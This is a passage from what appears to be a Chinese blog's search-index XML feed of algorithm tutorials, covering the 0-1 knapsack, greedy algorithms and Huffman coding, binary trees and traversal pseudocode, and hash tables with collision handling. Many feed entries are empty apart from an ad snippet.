第三节，我们教你应用第二节讲的动态规划理论知识，实战解决三个非常经典的动态规划问题，加深你对理论的理解。弄懂了这三个例子，对于动态规划这个知识点，你就算入门了。 01背包问题 我在将贪心算法、回溯算法的时候，多次降到背包问题，今天，我们依旧那这个问题来举例。 对于一组不同重量、不可分割的物品，我们需要选择一些装入背包，在满足背包最大重量限制的情况下，背包中物品中重量的最大值是多少呢？ 关于这个问题，我们上一节讲了回溯算法的解决方法，也就是穷举搜索所有可能的解法，然后找出满足条件的最大值。不过，回溯算法的复杂度比较高，是指数级别的。那有没有什么规律，可以有效降低时间复杂度呢？我们一起来看看。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-回溯算法]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-分治算法]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E5%88%86%E6%B2%BB%E7%AE%97%E6%B3%95.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-贪心算法：如何用贪心算法实现Huffman压缩编码]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95.html</url>
    <content type="text"><![CDATA[前言 我们学过了基本的数据结构和算法，接下来我们学习几种更加基本的算法，贪心算法、分治算法、回溯算法、动态规划，确切的说，他们应该是算法思想，并不是具体的算法，常用来指导我们设计具体的算法和编码等。 贪心、分治、回溯、动态规划这四个算法思想，原理理解起来都不难，但是要真正掌握并且灵活应用，并不是件容易的事情。 今天我们先来学习一下贪心算法（greedy algorithm）。贪心算法有很多经典的应用，比如霍夫曼编码、Prim和Kurskal最小生成树算法、还有Dijkstra单源最短路径算法。最小生成树算法和最短路径算法我们后面再说，今天我们讲一下霍夫曼编码，看看它是如何利用贪心算法来实现对数据压缩编码，有效节省数据存储空间的。 如何理解”贪心算法“ 关于贪心算法，我们先看一个例子。 假设我们有一个可以容纳100kg物品的背包，可以装各种物品。我们有以下5种豆子，每种豆子的总量和总价值都各不相同。为了让背包中所装物品的总价值最大，我们如何选择在背包中装那些豆子？每种豆子又该装多少呢？ 物品 重量（kg） 总价值(元) 黄豆 100 100 绿豆 30 90 红豆 60 120 黑豆 20 80 青豆 50 75 实际上，这个问题很简单，我估计你一下子就能想出来，没错，我们只要先算一算每个物品的单价，按照单价由高到低依次来装就行了。单价从高到低排列，顺序依次是：黑豆、绿豆、红豆、青豆、黄豆，所以，我们可以往背包里装20kg黑豆，30kg绿豆、50kg红豆。 这个问题的解决方法显而易见，它本质上借助的就是贪心算法。结合这个问题，我们来总结一下贪心算法的解决步骤。 第一步，当我们看到这类问题的时候，首先要联想到贪心算法：针对一组数据，我们定义了限制值和期望值，希望从中选出几个数据，在满足限制值的情况下，期望值最大。 类比到刚刚的例子，限制值就是重量不能超过100kg，期望值就是物品的总价值。这组数据就是5种豆子。我们从中选出一部分，满足重量不超过100kg，并且总价值最大。 第二步，我们尝试看下这个问题是否能用贪心算法解决：每次选择当前情况下，在对限制值同等贡献量的情况下，对期望值贡献最大的数据。 类比到刚才的例子，我们每次都从剩下的豆子里面，选择单价最高的，也就是重量相同的情况下，对价值贡献最大的豆子。 第三步，我们举几个例子看下贪心算法产生的结果是否是最优的。大部分情况下，举几个例子验证一下就可以了，严格的证明贪心算法的正确性，是非常复杂的，需要涉及比较多的数学推理。而且，从实践的角度看，大部分能用贪心算法解决的问题，贪心算法的正确性都是显而易见的，也不需要严格的数学推导证明。 实际上，用贪心算法解决问题的思路，并不总能给出最优解。 我举一个例子，在一个有权图中，我们从顶点S开始，找一条到顶点T的最短路径（路径中边的权值和最小）。贪心算法的解决思路是，每次都选择一条跟当前顶点相连的权最小的边，知道找到顶点T。按照这种思路，我们求出的最短路径是S–A–E–T，路径长度是1+4+4=9. 但是这种贪心的选择方式，最终求的路径并不是最短路径，因为路径S–B–D–T才是最短路径，因为这条路径上的长度是2+2+2=6.为什么贪心算法在这个问题上不工作了呢？ 在这个问题上，贪心算法不工作的主要原因是，前面的选择，会影响到后面的选择。如果我们第一步从顶点S走到顶点A，那接下来面对的顶点和边，跟第一步从顶点S走到顶点B，是完全不同的。随意即便我们第一步选择最优的走法，但有可能因为这一步选择，导致后面每一步的选择都很糟糕，最终也就无缘全局最优解了。 贪心算法实战分析 对于贪心算法，你是不是还有点懵？如果死抠理论的话，很难啊理解透彻。掌握贪心算法的关键是多练习，只要多练习几道题，自然就有感觉了。 1、分糖果 我们有m个糖果和n个孩子。我们现在要把糖果分给这些孩子吃，但是糖果少，孩子多（m &lt; n），所以糖果只能分给一部分孩子。 每个糖果的大小不等，这m个糖果的大小分别是s1，s2,s3,s4……sm。除此之外，每个孩子对糖果大小的需求也是不一样的，只有糖果的大小大于等于孩子对糖果大小的需求的时候，孩子才得到满足，假设这n个孩子对糖果大小的需求分别是g1,g2,g3,g4……gn。 我的问题是，如何分配糖果，能尽可能满足最多数量的孩子。 我们可以把这个问题抽象成，从n个孩子中，抽取一部分孩子分配糖果，让满足的孩子的个数（期望值）是最大的。这个问题的限制值就是糖果的个数m。 我们现在来看如何利用贪心算法来解决。对于一个孩子来说，如果小的糖果可以满足，我们就没必要用更大的糖果，这样更大的就可以留给其他对糖果大小需求更大的孩子。另一方面，我们可以从需求小的孩子开始分配糖果，因为满足一个需求大的孩子跟满足一个需求小的孩子，对我们贡献的期望值是一样的。 我们每次从剩下的孩子中，找出对糖果大小需求最小的孩子，然后发给他剩下的糖果能满足他的需求的最小的糖果。这样的分配方案，就是满足孩子个数最多的方案。 2、钱币找零 这个问题在我们生活中更加普遍。假设我们有1元、2元、5元、10元、20元、50元、100元这些面额的纸币，他们的张数分别是c1、c2、c5、c10、c20、c50、c100.我们现在要用这些钱来支付k元，最少要用到多少张纸币呢？ 在生活中，我们一般会先用面额最大的来支付，就继续用面额更小一点的，以此类推，最后用1元补齐。 在贡献相同期望值（纸币数目）的情况下，我们希望多贡献点金额，这样就可以让纸币更少，这就是一种贪心算法的解决思路。直觉告诉我们，这种处理方法就是最好的，实际上，要更严谨的证明这种贪心算法的正确性，需要比较复杂、有技巧的数学推倒，不建议花太多的时间在上main，不过如果你感兴趣的话，可以自己研究下。 3、区间覆盖 假设我们有n个区间，区间的起始端点和结束端点分别是[l1, r1],[l2, r2], [l3, r3]……, [ln, rn]。我们从这n个区间中选出一部分区间，这部分区间满足两两不相交（端点相交的情况不算相交），最多能选出多少个区间？ 这个问题的处理思路稍微不是那么好懂，不过，我建议你最好能弄懂，因为这个处理思想在很多贪心算法问题中都有用到，比如任务调度、教师排课等。 这个问题的解决思路是这样的：我们假设区间中最左端点是lmin，最右端点是lmax。这个问题就相当于，我们选择几个不相交的区间，从左向右将[lmin， lmax]覆盖上。我们按照起始端点从小到大的顺序对这n个区间排序。 我们每次选择的时候，左端点跟前面的已经覆盖的区间不重合，右端点又尽量小的，这样可以让剩下的未覆盖区间尽可能的大，就可以放置更多的区间 解答开篇 经过上面的几个例子，相信你已经对贪心算法有了一个大致的了解，现在来看看开篇的问题，如何用贪心算法实现霍夫曼编码？ 假设我有1000个字符串的文件，每个字符占1个byte，存储这1000个字符就需要8000bits，那有没有更加节省空间的存储方式呢？ 假设我们通过统计分析发现，这1000个字符中只包含6种不通的字符。假设他们分别是a、b、c、d、e、f。而三个二进制位bit就可以标识8个不同的字符，所以，为了尽量减少存储空间，每个字符我们用3个二进制位来表示。那存储1000个字符只需要3000bit就可以了，比原来的存储方式节省了很多空间。不过还有没有更加节省空间的存储方式呢？ 霍夫曼编码就要登场了。霍夫曼编码是一种十分有效的编码方法，广泛应用于数据压缩中，其压缩率通常在20%-90%之间。 霍夫曼编码不仅会考察文本中有多少个不同的字符，还会考察每个字符出现的频率，根据频率的不同，选择不同的编码，霍夫曼编码试图用不等长的编码方法，来进一步增加压缩的效率。如果给不同频率的字符选择不同长度的编码呢？根据贪心的思想，我么可以把出现频率比较多的字符，用稍微短一些的编码，出现频率较少的字符，用稍微长一点的编码。 对于等长的编码来说，我们解压缩起来很简单。比如刚才呢那个例子中，我们用3个bit表示一个字符。在解压缩的时候，我们每次从文本中读取3位二进制码，然后翻译成对应的字符。但是，霍夫曼编码是不等长的，每次应该读取1位还是2位、3位来解压缩呢？这个问题就导致霍夫曼编码解压缩起来比较复杂。为了避免解压缩过程中的歧义，霍夫曼编码要求各个字符的编码之间，不会出现某个编码是另一个编码前缀的情况。 ｜｜ (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-AC自动机]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-AC%E8%87%AA%E5%8A%A8%E6%9C%BA.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-Trie树]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-Trie%E6%A0%91.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-字符串匹配基础（下）]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-字符串匹配基础（中）]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%AD%EF%BC%89.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-字符串匹配基础（上）]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8A%EF%BC%89.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-深度和广度优先搜索]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E6%B7%B1%E5%BA%A6%E5%92%8C%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-图的表示]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-堆的应用]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E5%A0%86%E7%9A%84%E5%BA%94%E7%94%A8.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-堆和堆排序]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E5%A0%86%E5%92%8C%E5%A0%86%E6%8E%92%E5%BA%8F.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-递归树]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92%E6%A0%91.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-红黑树（下）]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E7%BA%A2%E9%BB%91%E6%A0%91%EF%BC%88%E4%B8%8B%EF%BC%89.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-红黑树（上）]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E7%BA%A2%E9%BB%91%E6%A0%91%EF%BC%88%E4%B8%8A%EF%BC%89.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-二叉树基础（下）]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%8F%89%E6%A0%91%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-二叉树基础（上）：什么样的二叉树适合用数组来存储？]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%8F%89%E6%A0%91%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8A%EF%BC%89.html</url>
    <content type="text"><![CDATA[前言 前面我们讲的都是线性表结构，栈、队列等等。今天我们将一种非线性表结构，树。树这种数据结构比线性表的数据结构要复杂的多，内容也比较多，分了四节来讲解。 章节 内容 二叉树（上） 树、二叉树 二叉树（下） 二叉查找树 红黑树 平衡二叉查找树、红黑树 递归树 递归树 在正式开始今天内容之前，我们还是先看一道思考题：二叉树有哪几种存储方式？什么样的二叉树适合用数组来存储？ 树（Tree） 我们首先来看，什么是树？再完备的定义，也不如图直观，我们可以从以下几颗树来看看，树这种数据结构有什么特征？ 你有没有发现，树这种数据结构很像我们现实生活中的“树”，这里面每个元素我们叫做“节点”，用来连线相邻节点之间的关系，我们叫做“父子关系” 比如下面这幅图，A节点就是B节点的父节点，B节点是A节点的子节点。B、C、D这三个节点的父节点是同一个节点，所以他们之间互称为兄弟节点。我们把没有父节点的节点叫做根节点，也就是图中的节点E，我们把没有子节点的节点叫做叶子节点或者叶节点。比如途中的G、H、I、J、K、L都是叶子节点。 除此之外，关于书，还有三个比较相似的概念：高度、深度、层。他们的定义是这样的： 节点的高度= 节点到叶子节点的最长路径（边数） 节点的深度 = 根节点到这个节点所经历的边的个数 节点的层数 = 节点的深度 + 1 树的高度 = 根节点的高度 这三个概念的定义比较容易混淆，描述起来也比较空洞，我举个例子说明一个，你一看就应该能明白 记住这几个概念，我还有一个小窍门，就是类比高度、深度、层这几个名次在我们生活中的意义。 在我们的生活中，“高度”这个概念，其实就是从下往上度量，比如我们要度量第10层楼的高度、第13层楼的高度，起点都是地面。所以树这种数据结构的高度也是一样的，从最底层开始计算，并且计数的起点是0. “深度”这个概念在生活中是从上往下度量的，比如水中鱼的深度，是从海平面开始度量的，所以树这种数据结构的深度也是类似的，从根节点开始度量，并且计数起点是0. “层”跟深度的计算类似，不过，计算的起点是1，也就是说根节点位于第一层。 二叉树（Binary Tree） 树的机构多种多样，不过我们最常用的还是二叉树。 二叉树，顾名思义，每个节点最多有两个“叉”，也就是两个子节点，分别是左子节点和右子节点。不过，二叉树并不要求每个节点都有两个子节点，有的节点只有左子节点，有的节点只有右子节点。我画的这几个都是二叉树，以此类推，你可以想象以下四叉树、八叉树是什么样子。 这个图里面，有两个比较特殊的二叉树，分别是编号2和编号3的二叉树。 其中，编号为2的二叉树中，叶子节点全都在最底层，除了叶子节点外，每个节点都有左右子节点，这种二叉树就叫做满二叉树。 编号为3的二叉树中，叶子节点都在最下两层，最后一层的叶子节点都靠左排列，并且除了最后一层，其他层的节点个数都要达到最大，这种二叉树叫做完全二叉树。 满二叉树很好理解，也很好识别，但是完全二叉树，有的人可能就分不清了。 你可能会说，满二叉树的特征非常明显，我们把它单独拎出来，这个可以理解，但是完全二叉树的特征不怎么明显，但从长相上来看，完全二叉树并没有特殊的地方，更像是芸芸众树中的一种。 那我们为什么还要特意把它拎出来呢？为什么偏偏把最后一层的叶子节点靠左排列的叫完全二叉树？如果靠右排列就不能叫完全二叉树了吗？这个定义的由来或者说目的在哪里？ 要理解完全二叉树的由来，我们需要先了解，如何表示（或者存储）一颗二叉树？ 想要存储一颗二叉树，我们有两种方法，一种是基于指针或者引用的二叉链式存储法，一种是基于数组的顺序存储法。 我们先来看比较简单、直观的链式存储法。从图中你应该可以很清楚的看到，每个节点有三个字段，其中一个存储数据，另外两个指向左右子节点的指针。我们只要拎住根节点，就可以通过左右子节点的指针，把整颗树都串起来，这种存储方式我们比较常用。大部分二叉树的代码都是通过这种方式实现的。 我们再来看，基于数组的顺序存储法，我们把根节点存储在下标i=1的位置，那左子节点存储在下标为2i=2的位置，右子节点存储在2i+1=3的位置。依次类推，B节点的左子节点存储在2i=22=4的位置，右子节点存储在2i+1=22+1=5的位置。 我来总结一下，如果节点X存储在数组中下标为i的位置，下标为2i的位置存储的就是左子节点，下标为21+1的位置存储的就是右子节点。反过来，下标为i/2的位置存储的就是它的父节点。通过这种方式，我们只要知道根节点存储的位置（一般情况下，为了方便计算子节点，根节点会存储在下标为1的位置），这样就可以通过下标计算，把整颗树都串起来。 不过，我刚刚举的例子是一颗完全二叉树，所有仅仅“浪费”了一个下标为0的存储位置。如果是非完全二叉树，其实会浪费比较多的数组存储空间，你可以看我举的下面的例子。 所以如果某棵二叉树是完全二叉树，那用数组存储无疑是最节省内存的一种方式。因为数组的存储方式并不需要像链式存储法那样，要存储额外的左右子节点的指针。这也是为什么完全二叉树要单独拎出来的原因，也是为什么完全二叉树要求最后一层的子节点都靠左的原因。 当我们讲到堆和堆排序的时候，你会发现，堆其实就是一种完全二叉树，最常用的存储方式就是数组。 二叉树的遍历 前面我讲了二叉树的基本定义和存储方法，现在我们来看二叉树中非常重要的操作，二叉树的遍历。这也是非常常见的面试题。 如何将所有节点都遍历打印出来呢？经典的方法有三种，前序遍历、中序遍历、后序遍历。其中，前、中、后序，表示的是节点与它的左右子树节点遍历打印的先后顺序。 前序遍历是指，对于树中的任意节点来说，先打印这个节点，然后再打印它的左子树，最后打印它的右子树。 中序遍历是指，对于树中的任意节点来说，先打印它的左子树节点，在打印它本身，最后打印它的右子树节点。 后序遍历是指，对于树中的任意节点来说，先打印它的左子树节点，在打印它的右子树节点，最后打印这个节点本身。 实际上，二叉树的前、中、后序遍历就是一个递归的过程。比如，前序遍历，其实就是先打印根节点，然后再递归地打印左子树，最后递归的打印右子树。 写递归代码的关键，就是看能不能写出递推公式，而写递推公式的关键，就是要看解决问题A，就假设子问题B、C已经解决，然后再来看如何利用B、C来解决A。所以，我们可以把前、中、后序遍历的递推公式都写出来。 12345678前序遍历的递推公式preOrder(r) = print r -&gt; preOrder(r-&gt;left) -&gt; preOrder(r-&gt;right)中序遍历的递推公式inOrder(r) = inOrder(r-&gt;left) -&gt; print r -&gt; inOrder(r-&gt;right)后序遍历的递推公式postOrder(r) = postOrder(r-&gt;left) -&gt; postOrder(r-&gt;right) -&gt; print r 有了递推公式，代码写起来就简单多了，这三种遍历方式的代码，我都写出来了，你可以看看。 123456789101112131415161718192021void preOrder(Node* root) &#123; if (root == null) return; print root; // 伪代码，表示打印root节点 preOrder(root-&gt;left) preOrder(root-&gt;right)&#125;void inOrder(Node* root) &#123; if(root == null) return; inOrder(root-&gt;left); print root; inOrder(root-&gt;right)&#125;void postOrder(Node* root) &#123; if(root == null) return; postOrder(root-&gt;left); postOrder(root-&gt;right) print root;&#125; 二叉树的前、中、后序遍历是不是很简单？你知道二叉树遍历的时间复杂度是多少吗？我们一起来看看。 从我前面画的前、中、后序遍历的顺序图，可以看出来，每个节点最多被访问两次，所以遍历的时间复杂度，跟节点的个数n成正比，也就是说二叉树的遍历的时间复杂度是O(n). 解答开篇|内容小姐 今天，讲了一种非线性表数据结构，树。关于树，有几个比较常用的概念你需要掌握，那就是跟节点、叶子节点、父节点、子节点、兄弟节点，还有节点的高度、深度、层数，以及树的高度。 我们平时最常用的就是二叉树。二叉树的每个节点最多有两个子节点，分别是左子节点和右子节点。二叉树中，有两个比较特殊的树，满二叉树和完全二叉树。满二叉树是完全二叉树的一中特殊情况。 二叉树既可以用链式存储，也可以用数组顺序存储。数组顺序存储的方式比较适合完全二叉树，其他类型的二叉树用数组存储会比较浪费存储空间。除此之外，二叉树里非常重要的操作就是前、中、后序遍历操作，遍历的操作时间复杂度是O(n)，你需要理解并能用递归代码来实现， 课后思考 给定一组数据，比如1、3、5、6、9、10.你来算算，可以构建出多少种不同的二叉树？ 我们讲了三种二叉树的遍历方式，前、中、后序。实际上，还有另外一种遍历方式，就是按层遍历，你知道如何实现吗？ (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-哈希算法（下）]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%8B%EF%BC%89.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-哈希算法（上）]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%8A%EF%BC%89.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-散列表（下）]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E6%95%A3%E5%88%97%E8%A1%A8%EF%BC%88%E4%B8%8B%EF%BC%89.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-散列表（中）]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E6%95%A3%E5%88%97%E8%A1%A8%EF%BC%88%E4%B8%AD%EF%BC%89.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-散列表（上）：word文档中的单词拼写检查功能是如何实现的？]]></title>
    <url>%2Fposts%2F2019-09-17-%E7%AE%97%E6%B3%95-%E6%95%A3%E5%88%97%E8%A1%A8%EF%BC%88%E4%B8%8A%EF%BC%89.html</url>
    <content type="text"><![CDATA[前言 Word这种文本编辑器你平时应该经常使用吧，那你有没有留意过它的拼写检查功能呢？一旦我们在Word中输入一个错误的英文单词，它就会用标红的方式提示“拼写错误”。Word的这个单词检查功能，虽然很小但是却非常实用，你有没有想过，这个功能是如何实现的呢？ 其实啊，一点都不难，只要你学会今天的内容，散列表（Hash Table）。你就能像微软Office工程师一样，轻松实现这个功能， 散列思想 散列表的英文叫“Hash Table”，我们平时也叫它“哈希表”或者“Hash 表”，你也一定经常听过它。但是你是不是真的理解这种数据结构呢？ 散列表用的是数组支持按照下标随机访问数据的特性，所以散列表其实就是数组的一种扩展，由数组演化而来，可以说，没有数组，就没有散列表。 我用一个例子来解释一下。假如我们有89名选手来参加学校运动会。为了方便记录成绩，每个选手胸前都会贴上自己的参赛编码。这89名选手的编号依次是1到89.现在我们希望编程实现这样一个功能，通过编号快速的找到对应的选手信息，你会怎么做呢？ 我们可以把这89名选手的信息存放在数组中。编号为1的选手，我们放到数组中下标为1 的位置，编号为2的选手，我们放到数组中编号为2的位置。以此类推，编号为k的选手放到数组中下标为k的位置。 因为参赛编号跟数组下标一一对应，当我们需要查询参赛编号为x的选手信息的时候，我们只需要将下标为x的数组元素取出来就可以了，时间复杂度就是O(1)。这样按照编号查找选手信息，效率是不是很高。 实际上，这个例子已经用到了散列思想。在这个例子里，参赛编号是自然数，并且与数组下标形成一一映射，所以利用数组支持根据下标随机访问的时候，时间复杂度是o(1)这一特性，就可以实现快速查找编号对应的选手信息。 你可能说了，这个例子中蕴含的散列细想还不够明显，那我来改造一下这个例子。 假如校长说，参赛编号不能设置的这么简单，要加上年级、班级这些更详细的信息，所以我们把编号规则稍微修改一下，用6位数字来表示，比如051167，其中，前两位05表示年级，中间两位11表示班级，随后两位还是原来的编号1到89.这个时候我们该如何去存储这些选手信息，才能够支持通过编号快速查找选手信息呢？ 思路还是跟前面类似。尽管我们不能直接把编号作为数组下标，但是我们可以截取参赛编号的后两位最为数组下标，来存储选手信息，当通过参赛编号查询选手信息的时候，我们用同样的方式，取参赛编号的后两位，作为数组下标，来读取数组中的数据。 这就是典型的散列思想。其中，参赛选手的编号我们叫做键（key）或者关键字。我们用它来标识一个选手。我们把参赛编号转化为数组下标的映射方法就叫做散列函数。而散列函数的计算得到的值就是散列值。 通过这个例子，我们可以总结出这样的规律，散列表用的就是数组支持下标随机访问的时候，时间复杂度是O(1)的特性。我们通过散列函数把元素的键值映射为下标，然后将数据存储在数组中对应下标的位置。当我们按照键值查询元素时，我们用同样的散列函数，将键值转化为数组下标，从对应的数组下标的位置取数据。 散列函数 从上面的例子可以看出，散列函数在散列表中起着非常关键的作用。现在我们就来学习下散列函数。 散列函数，顾名思义，它是一个函数。我们可以把它定义成hash(key)，其中key表示元素的键值，hash(key)的值表示经过散列函数计算得到的散列值。 那第一个例子中，编号就是数组下标，所以hash(key)就等于key。改造后的例子，写成散列函数稍微有点复杂。我用伪代码把它写成函数就是下面这样。 1234567int hash(String key)&#123; // 获取后两位字符 String lastTwoChars = key.substr(length-2, length); // 转换为整数 int hashValue = convert lastTwoChars to int-type; return hashValue;&#125; 刚刚举的例子，散列函数比较简单，也比较容易想到。但是如果参赛选手的编号是随机生成的6位数字，又或者用的是a到z之间的字符，该如和设计构造散列函数呢？我总结了三点散列函数设计的基本要求： 散列函数计算得到的散列值是一个非负整数； 如果key1 = key2，那么hash(key1) = hash(key2)； 你如key1 ≠ key2，那么hash(key1) ≠ hash(key2)； 我来解释一下这三点。其中，第一点理解起来应该没什么问题。因为数组下标是从0开始的，所以散列函数生成的散列值也要是非负整数。第二点也很好理解。相同的key，经过散列函数得到的散列值也应该是相同的。 第三点理解起来可能会有问题，我着重说一下。这个要求看起来合情合理，但是在真实的情况下，要想找到一个不同的key对应的散列值都不一样的散列函数，几乎是不可能的。即使是像业界著名的MD5、SHA、CRC等哈希算法，也无法完全避免这种冲突。而且，因为数组的存储空间有限，也会加大散列冲突的概率。 所以我们几乎无法找到一个完美的无冲突的散列函数，即使找到，付出的时间成本、计算成本也是很大的。所以针对散列冲突，我们需要通过其他途径来解决， 散列冲突 再好的散列函数也无法避免散列冲突，那究竟该如何避免散列冲突问题呢？我们常用的散列冲突解决方法有两种，开放寻址法和链表法。 1、开放寻址法开发寻址法的核心思想是，如果出现了散列冲突，我们就重新探测一个空闲位置，将其插入。那如何重新探测新的位置呢？我先将一个比较简单的探测方法，线性探测。 当我们往散列表中插入数据时，如果某个数据经过散列之后，存储位置已经被占用了，我们就从当前位置开始，依次往后查找，看是否有空闲位置，直到找到为止。 我说的可能比较抽象，我举一个例子给你说明一下。这里面黄色的表示空闲为止，橙色的表示已经存储了数据。 从图中可以看出，散列表的大小为10，在元素x插入散列表之前，已经6个元素插入到散列表中。x经过hash算法之后，被散列到位置下标为7的位置，但是这个位置我们已经有数据了，所以就产生了冲突。于是我们就顺序的往后一个一个找，看看有没有空闲的位置，遍历到尾部都没有找到空闲的位置，于是我们在次开始从表头开始找，直到找到空闲的位置2，于是将其插入到这个位置。 在散列表中查找元素的过程有点类似插入过程，我们通过散列函数求出要查找元素的键值对应的散列值，然后比较数组中下标为散列值的元素和要查找的元素。如果相等，则说明就是我们要找的元素；否则就顺序往后依次查找。如果遍历到素组中的空闲位置，还没有找到，就说明要查找的元素并没有在散列表中。 散列表跟数组一样，不仅支持插入、查找操作，还支持删除操作，对于使用线性探测发解决冲突的散列表，删除操作稍微复杂，我们不能单纯的将要删除的元素设置为空，为什么呢？ 还记得我们刚将的查找操作吗？在查找的时候，一旦我们通过线性探测方法，找到一个空闲位置，我们就可以认定散列表中不存在这个数据，但是，如果这个空闲位置是我们后来删除的，就会导致原来的查找算法失效，本来存在的数据，会被认定为不存在，这个问题如何解决呢？ 我们可以将删除的元素，特殊标记为deleted。当线性探测的时候，遇到标记为deleted的空间，并不是停下来，而是继续往下探测。 你可能已经发现了，线性探测法存在很大问题。当散列表中插入的数据越来越多时，散列冲突发生的可能性会越来越大，空闲位置会越来越少，线性探测的时间就会越来越久。极端情况下，我们可能需要探测整个散列表，所以最坏情况下的时间复杂度是O(n)。同理，在删除和查找时，也有可能会探测整张散列表，才能找到要查找或者删除的数据。 对于开放寻址冲突解决方法，除了线性探测方法之外，还有另外两种比较经典的探测方法，二次探测（Quadratic Probing） 和双重散列（Double hashing）。 所谓二次探测，跟线性探测很像，线性探测每次探测的步长是1，那它探测的下标序列就是hash(key) + 0, hash(key) + 1, hash(key) + 2… 